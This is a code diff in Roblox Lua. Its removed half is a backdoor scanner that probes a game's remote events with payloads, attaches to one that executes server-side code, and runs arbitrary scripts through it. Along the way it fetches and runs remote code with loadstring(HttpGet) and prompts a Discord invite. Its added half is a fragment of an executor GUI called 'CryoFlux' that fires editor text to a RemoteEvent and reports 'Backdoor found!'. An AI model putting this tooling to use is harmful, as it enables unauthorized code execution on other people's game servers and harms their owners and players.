-		connection = insertService.ChildAdded:Connect(function(object)
-			if object.Name ~= nonce then return end connection:Disconnect()
-
-			local rawStdout = object:GetAttribute("stdout")
-			local jsonConverted, stdout = pcall(httpService.JSONDecode, httpService, rawStdout)
-
-			if jsonConverted then
-				for _, output in stdout do
-					local outputType, timestamp = (
-						if output[1] == 0 then
-							Enum.MessageType.MessageOutput
-						elseif output[1] == 1 then
-							Enum.MessageType.MessageWarning
-						else nil
-					), output[2]
-					local outputMsg = ""
-					for index = 1, output[3] do
-						outputMsg ..= `{tostring(output[4][index]) or nil} `
-					end
-
-					executorAPI.console.createOutput(outputMsg, outputType, timestamp)
-				end
-			end
-
-			if not object.Value then
-				executorAPI.console.createOutput(object:GetAttribute("stderr") or "Error occured, no output from Lua.", Enum.MessageType.MessageError)
-			end
-		end)
-		task.delay(60, connection.Disconnect, connection)
-	end
-
-	if (config.redirectRemote and remoteInfo.redirection.initialized) then
-		remoteArgs = applyRedirectedRemoteSecurity(source)
-	else
-		source = (if remoteInfo.srcFunc then remoteInfo.srcFunc(source) else source)
-		remoteArgs[remoteInfo.argSrcIndex] = source
-	end
-	task.spawn(remoteFunc, remoteInfo.instance, unpack(remoteArgs))
-end
-
-local function initializeRemoteInfo(params, overwriteRemoteInfo)
-	if (remoteInfo.foundBackdoor and not overwriteRemoteInfo) then return end
-
-	remoteInfo.foundBackdoor = true
-	for name, value in params do
-		remoteInfo[name] = value
-	end
-end
-
-local function initRemoteRedirection()
-	if not (remoteInfo.foundBackdoor and (config.redirectRemote and not remoteInfo.redirection.initialized)) then return false end
-	local nonce = generateRandString(32, true)
-
-	execScript(`require({if remoteInfo.redirection.__testver then 11906414795 else 11906423264})("{nonce}", %userid%)`, true) -- if you wanna try out new features, set 'remoteInfo.redirection.__testver' to true
-	waitUntil(5, function() return insertService:GetAttribute(nonce) end) -- we need to improvise until :WaitForAttribute is added
-	local redirectedRemotePath = insertService:GetAttribute(nonce)
-
-	if not redirectedRemotePath then return newNotification(msgOutputs.remoteRedirectLoadFailed) end
-	local redirectedRemote = pathToInstance(redirectedRemotePath)
-
-	if redirectedRemote and
-		redirectedRemote:IsA("RemoteEvent") and
-		redirectedRemote:GetAttribute("isNonced")
-	then
-		remoteInfo.redirection.initialized = true
-
-		initializeRemoteInfo({
-			["instance"] = redirectedRemote,
-			["args"] = {"source"},
-			["argSrcIndex"] = 1
-		}, true)
-
-		insertService:GetAttributeChangedSignal(nonce):Connect(function()
-			local newPath = insertService:GetAttribute(nonce)
-			if not newPath then return end
-			local newRemote = pathToInstance(newPath)
-
-			if newRemote and
-				newRemote:IsA("RemoteEvent") and
-				newRemote:GetAttribute("isNonced")
-			then
-				remoteInfo.instance = newRemote
-			end
-		end)
-		return true
-	else
-		newNotification(msgOutputs.remoteRedirectLoadFailed)
-		return false
-	end
-end
-
-local function initializeDiscordInvite(inviteCode: string)
-	if config.__STOPINVITEPROMPT then return end
-	local http_request = (syn and syn.request) or (http and http.request) or request or http_request
-
-	local msgBoxResult = executorAPI.misc.newMessageBox("Default", msgBoxParams.DiscordInvitePrompt)
-	if msgBoxResult.ClickedButton == 0 then
-		local promptRequest = (
-			if http_request then
-				http_request({
-					Url = "http://127.0.0.1:6463/rpc?v=1",
-					Method = "POST",
-
-					Headers = {
-						["Content-Type"] = "application/json",
-						["Origin"] = "https://discord.com"
-					},
-					Body = httpService:JSONEncode({
-						["args"] = {["code"] = inviteCode},
-						["cmd"] = "INVITE_BROWSER",
-						["nonce"] = httpService:GenerateGUID()
-					})
-				})
-			else nil
-		)
-
-		if not promptRequest or (promptRequest.StatusCode ~= 200 or httpService:JSONDecode(promptRequest.Body).data.code == 4011) then
-			setclipboard(`https://discord.gg/{inviteCode}`)
-			executorAPI.misc.newMessageBox("Default", msgBoxParams.DiscordInviteCopied)
-			return
-		end
-	end
-end
-
-local function onAttached(remoteInfoParams)
-	if (remoteInfo.foundBackdoor and remoteInfo.instance) then return end
-	initializeRemoteInfo(remoteInfoParams)
-	newNotification("Attached!")
-	logToConsole("warn", string.format(msgOutputs.attached, getFullNameOf(remoteInfoParams.instance), remoteInfoParams.instance.ClassName, remoteInfoParams.payloadName or "nil"))
-	initRemoteRedirection()
-
-	executorAPI = loadstring(game:HttpGet("https://raw.githubusercontent.com/jLn0n/executor-gui/main/src/loader.lua"))({
-		mainTabText = msgOutputs.mainTabText,
-		customExecution = true,
-		executeFunc = function(source) return execScript(source) end,
-	})
-	task.spawn(initializeDiscordInvite, "jvb7XNzNPN")
-
-	for _, scriptSrc in config.autoExec do
-		execScript(scriptSrc)
-	end
-end
-
-local function testRemote(nonce, remoteObj, remoteObjId)
-	local remoteObjFunc = getRemoteFunc(remoteObj)
-
-	for payloadIndex, payloadInfo in payloadList do runService.Heartbeat:Wait()
-		local remotePassed = (if payloadInfo.Verifier then payloadInfo.Verifier(remoteObj) else true)
-		if (not remotePassed or not payloadInfo.Args) then continue end
-
-		local currentPayload = table.clone(payloadInfo.Args)
-		local argSrcIdx = table.find(currentPayload, "source")
-		if not argSrcIdx then continue end
-
-		currentPayload[argSrcIdx] = string.format(sourcePayload, nonce, `{remoteObjId}|{payloadInfo.Name}`)
-		pcall(task.spawn, remoteObjFunc, remoteObj, unpack(currentPayload))
-	end
-end
-
-local function scanBackdoors()
-	if remoteInfo.foundBackdoor then return end
-	local remotesList = getRemotes()
-	local nonce = generateRandString(32, true)
-
-	local connection;
-	connection = logService.AttributeChanged:Connect(function(attributeName)
-		if attributeName ~= nonce then return end connection:Disconnect()
-		local remoteResult = string.split(logService:GetAttribute(nonce), "|")
-		local remoteObj = remotesList[remoteResult[1]]
-		local payloadInfo = config.backdoorPayloads[remoteResult[2]]
-
-		task.spawn(onAttached, {
-			["instance"] = remoteObj,
-			["args"] = payloadInfo.Args,
-			["argSrcIndex"] = table.find(payloadInfo.Args, "source"),
-			["payloadName"] = remoteResult[2]
-		})
-	end)
-
-	for remoteObjId, remoteObj in remotesList do runService.Heartbeat:Wait()
-		if remoteInfo.foundBackdoor then break end
-
-		logToConsole("print", string.format(msgOutputs.printRemote, getFullNameOf(remoteObj), remoteObjId, remoteObj.ClassName))
-		testRemote(nonce, remoteObj, remoteObjId)
-	end
-
-	waitUntil(2.5, function() return not connection.Connected end)
-	task.defer(connection.Disconnect, connection)
-end
--- main
-do -- config initialization
-	if not isfolder(CONSTANTS.FOLDER_NAME) then
-		makefolder(CONSTANTS.FOLDER_NAME)
-	end
-
-	local rawConfigFile = (
-		if isfile(`{CONSTANTS.FOLDER_NAME}/config.lua`) then
-			readfile(`{CONSTANTS.FOLDER_NAME}/config.lua`)
-		else game:HttpGet(CONSTANTS.CONFIG_URL)
-	)
-	local loadSuccess, loadedConfig do
-		loadSuccess, loadedConfig = pcall(loadstring(rawConfigFile))
-
-		if (not loadSuccess) then
-			newNotification(msgOutputs.configLoadFailed)
-			rawConfigFile = game:HttpGet(CONSTANTS.CONFIG_URL)
-			loadedConfig = loadstring(rawConfigFile)()
-		end
-	end
-	local successCount = 0
-
-	successCount += (if typeof(loadedConfig.autoExec) == "table" then 1 else 0)
-	successCount += (if typeof(loadedConfig.remoteFilters) == "table" then 1 else 0)
-	successCount += (if typeof(loadedConfig.scriptMacros) == "table" then 1 else 0)
-	successCount += (if typeof(loadedConfig.backdoorPayloads) == "table" then 1 else 0)
-	successCount += (if typeof(loadedConfig.cachedPlaces) == "table" then 1 else 0)
-
-	if (loadedConfig.configVer < 9 or successCount < 5) then newNotification(msgOutputs.outdatedConfig) end
-	config = loadedConfig
-
-	for payloadName, payloadInfo in config.backdoorPayloads do
-		local payloadInfoClone = table.clone(payloadInfo)
-		payloadInfoClone.Name = payloadName
-
-		table.insert(payloadList, payloadInfoClone)
-	end
-
-	table.sort(payloadList, function(tbl1, tbl2)
-		local tbl1Priority, tbl2Priority =
-			math.clamp((tbl1.Priority or 1024), 1, 1024), math.clamp((tbl2.Priority or 1024), 1, 1024)
-		return tbl1Priority < tbl2Priority
-	end)
-end
-do -- backdoor finding
-	local placeCacheData = config.cachedPlaces[game.PlaceId]
-
-	if placeCacheData then
-		local successCount = 0
-		local remoteObj = (if typeof(placeCacheData.Remote) == "string" then pathToInstance(placeCacheData.Remote) else placeCacheData.Remote)
-		local argSrcIndex = (if typeof(placeCacheData.Args) == "table" then table.find(placeCacheData.Args, "source") else nil)
-
-		successCount += (if (typeof(remoteObj) == "Instance" and (remoteObj:IsA("RemoteEvent") or remoteObj:IsA("RemoteFunction"))) then 1 else 0)
-		successCount += (if typeof(argSrcIndex) == "number" then 1 else 0)
-
-		if successCount >= 2 then
-			newNotification(string.format(msgOutputs.cacheLoaded, game.PlaceId))
-			onAttached({
-				["instance"] = remoteObj,
-				["srcFunc"] = placeCacheData.SourceFunc,
-				["args"] = placeCacheData.Args,
-				["argSrcIndex"] = argSrcIndex
-			})
-		else
-			newNotification(string.format(msgOutputs.cacheFailed, game.PlaceId))
-		end
-	else
-		local startTime = os.clock()
-
-		newNotification(msgOutputs.scanMsg1);newNotification(msgOutputs.scanMsg2)
-		scanBackdoors()
-		newNotification(string.format(msgOutputs.scanBenchmark, os.clock() - startTime))
-
-		if not remoteInfo.foundBackdoor then -- if no backdoor found
-			logToConsole("warn", msgOutputs.noBackdoorRemote)
-			newNotification(msgOutputs.noBackdoorRemote)
-		end
-	end
-                                                      end
+-- Toggle da janela
+
+local isMinimized = false
+
+ToggleBtn.MouseButton1Click:Connect(function()
+
+    if isMinimized then
+
+        -- Animação para expandir
+
+        game:GetService("TweenService"):Create(
+
+            Main,
+
+            TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+
+            {Size = UDim2.new(0, 500, 0, 350)}
+
+        ):Play()
+
+        ToggleBtn.Text = "-"
+
+        isMinimized = false
+
+    else
+
+        -- Animação para minimizar
+
+        game:GetService("TweenService"):Create(
+
+            Main,
+
+            TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+
+            {Size = UDim2.new(0, 500, 0, 40)}
+
+        ):Play()
+
+        ToggleBtn.Text = "+"
+
+        isMinimized = true
+
+    end
+
+end)
+
+-- Botão de executar
+
+ExecuteBtn.MouseButton1Click:Connect(function()
+
+    StatusText.Text = "Executing..."
+
+    
+
+    -- Verificar se o RemoteEvent existe
+
+    local remote = game:GetService("ReplicatedStorage"):FindFirstChild("RemoteEvent")
+
+    
+
+    if remote then
+
+        remote:FireServer(Editor.Text)
+
+        StatusText.Text = "Script sent to server!"
+
+    else
+
+        StatusText.Text = "Error: RemoteEvent not found"
+
+    end
+
+    
+
+    wait(2)
+
+    StatusText.Text = "Ready"
+
+end)
+
+-- Botão de limpar
+
+ClearBtn.MouseButton1Click:Connect(function()
+
+    Editor.Text = ""
+
+    StatusText.Text = "Editor cleared"
+
+    wait(1)
+
+    StatusText.Text = "Ready"
+
+end)
+
+-- Botão de fechar
+
+CloseBtn.MouseButton1Click:Connect(function()
+
+    CryoFlux:Destroy()
+
+end)
+
+-- Botão de tema branco
+
+local isWhiteTheme = false
+
+ThemeBtn.MouseButton1Click:Connect(function()
+
+    isWhiteTheme = not isWhiteTheme
+
+    
+
+    if isWhiteTheme then
+
+        -- Aplicar tema branco
+
+        Main.BackgroundColor3 = Color3.fromRGB(240, 240, 240)
+
+        NavBar.BackgroundColor3 = Color3.fromRGB(220, 220, 220)
+
+        Title.TextColor3 = Color3.fromRGB(50, 50, 50)
+
+        TabButtons.BackgroundColor3 = Color3.fromRGB(230, 230, 230)
+
+        ExecutorPage.BackgroundColor3 = Color3.fromRGB(250, 250, 250)
+
+        EditorFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+
+        Editor.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+
+        Editor.TextColor3 = Color3.fromRGB(50, 50, 50)
+
+        LineNumbers.TextColor3 = Color3.fromRGB(150, 150, 150)
+
+        ThemeBtn.Text = "Dark theme"
+
+    else
+
+        -- Aplicar tema escuro
+
+        Main.BackgroundColor3 = Color3.fromRGB(25, 28, 36)
+
+        NavBar.BackgroundColor3 = Color3.fromRGB(30, 33, 42)
+
+        Title.TextColor3 = Color3.fromRGB(100, 200, 255)
+
+        TabButtons.BackgroundColor3 = Color3.fromRGB(25, 28, 36)
+
+        ExecutorPage.BackgroundColor3 = Color3.fromRGB(20, 23, 30)
+
+        EditorFrame.BackgroundColor3 = Color3.fromRGB(15, 18, 25)
+
+        Editor.BackgroundColor3 = Color3.fromRGB(15, 18, 25)
+
+        Editor.TextColor3 = Color3.fromRGB(220, 240, 255)
+
+        LineNumbers.TextColor3 = Color3.fromRGB(100, 150, 180)
+
+        ThemeBtn.Text = "White theme"
+
+    end
+
+end)
+
+-- Configurar eventos dos tabs
+
+ExecutorTab.MouseButton1Click:Connect(function() SwitchTab(ExecutorTab) end)
+
+ScriptsTab.MouseButton1Click:Connect(function() SwitchTab(ScriptsTab) end)
+
+SettingsTab.MouseButton1Click:Connect(function() SwitchTab(SettingsTab) end)
+
+CreditsTab.MouseButton1Click:Connect(function() SwitchTab(CreditsTab) end)
+
+-- Atualizar números de linha quando o texto muda
+
+Editor:GetPropertyChangedSignal("Text"):Connect(UpdateLineNumbers)
+
+-- Verificação do RemoteEvent na tela de carregamento
+
+spawn(function()
+
+    wait(1) -- Simular tempo de carregamento
+
+    
+
+    local remoteExists = game:GetService("ReplicatedStorage"):FindFirstChild("RemoteEvent") ~= nil
+
+    
+
+    if remoteExists then
+
+        LoadStatus.Text = "Backdoor found! Loading"
+
+        wait(1)
+
+        LoadScreen.Visible = false
+
+        Main.Visible = true
+
+    else
+
+        LoadStatus.Text = "Backdoor not found, closing in 5 seg."
+
+        wait(5)
+
+        CryoFlux:Destroy()
+
+    end
+
+end)
+
+-- Inicializar
+
+SwitchTab(ExecutorTab)
+
+UpdateLineNumbers() 
